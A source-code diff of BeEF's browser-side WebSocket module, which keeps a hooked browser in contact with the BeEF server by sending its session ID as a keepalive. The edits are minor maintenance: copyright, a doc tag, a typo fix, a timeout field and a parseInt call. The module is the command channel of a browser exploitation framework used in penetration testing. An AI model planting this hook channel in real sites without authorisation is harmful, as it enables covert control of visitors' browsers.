@@ -1,22 +1,22 @@
 //
-// Copyright (c) 2006-2016 Wade Alcorn - wade@bindshell.net
+// Copyright (c) 2006-2020 Wade Alcorn - wade@bindshell.net
 // Browser Exploitation Framework (BeEF) - http://beefproject.com
 // See the file 'doc/COPYING' for copying permission
 //
 
 
 /**
- * @Literal object: beef.websocket
- *
  * Manage the WebSocket communication channel.
  * This channel is much faster and responsive, and it's used automatically
  * if the browser supports WebSockets AND beef.http.websocket.enable = true.
+ * @namespace beef.websocket
  */
 
 beef.websocket = {
 
     socket:null,
     ws_poll_timeout: "<%= @ws_poll_timeout %>",
+    ws_connect_timeout: "<%= @ws_connect_timeout %>",
 
     /**
      * Initialize the WebSocket client object.
@@ -43,7 +43,7 @@ beef.websocket = {
     },
 
     /**
-     * Send Helo message to the BeEF server and start async polling.
+     * Send Hello message to the BeEF server and start async polling.
      */
     start:function () {
         new beef.websocket.init();
@@ -85,7 +85,7 @@ beef.websocket = {
      */
     alive: function (){
         beef.websocket.send('{"alive":"'+beef.session.get_hook_session_id()+'"}');
-        setTimeout("beef.websocket.alive()", beef.websocket.ws_poll_timeout);
+        setTimeout("beef.websocket.alive()", parseInt(beef.websocket.ws_poll_timeout));
     }
 };
 
